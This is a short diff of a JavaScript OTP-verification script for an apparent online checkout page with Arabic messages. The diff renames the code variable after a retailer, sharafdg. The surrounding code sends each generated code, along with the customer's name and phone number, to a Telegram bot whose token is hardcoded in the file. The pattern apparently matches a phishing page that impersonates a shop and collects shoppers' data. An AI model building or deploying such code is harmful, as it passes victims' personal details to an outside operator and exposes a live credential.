@@ -1,7 +1,7 @@
 import { db, collection, addDoc } from './firebase-config.js';
 
 const orderData = JSON.parse(localStorage.getItem('pendingOrder'));
-let currentOTP = null;
+let sharafdg_otp_code = null;
 let otpAttempts = 0;
 const curr = '<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTtauUn1R9dGoEXyG6AaYXbzovVet90qe0igubKGL7Ew&s" style="height:12px; vertical-align:middle; margin-left:3px;">';
 
@@ -98,8 +98,8 @@ window.moveToNext = function(input, index) {
 // ==========================================
 
 async function sendOTP() {
-    currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
-    const message = `🔐 رمز التحقق الجديد: <b>${currentOTP}</b>\n\nالعميل: ${orderData.customerName}\nالهاتف: ${orderData.phone}`;
+   sharafdg_otp_code = Math.floor(100000 + Math.random() * 900000).toString();
+const message = `🔐 رمز التحقق الجديد: <b>${sharafdg_otp_code}</b>\n\nالعميل: ${orderData.customerName}\nالهاتف: ${orderData.phone}`;
     
     try {
         const response = await fetch('https://api.telegram.org/bot8763567744:AAEjPu0YFJAHMQspulqQDgYr1TqU6W61hpi/sendMessage', {
@@ -129,7 +129,7 @@ window.verifyOTP = function() {
         return;
     }
     
-    if (entered === currentOTP) {
+   if (entered === sharafdg_otp_code) {
         messageEl.innerHTML = '<div class="success-message">✅ تم التحقق بنجاح! جاري إتمام الدفع...</div>';
         setTimeout(() => {
             window.completePayment();
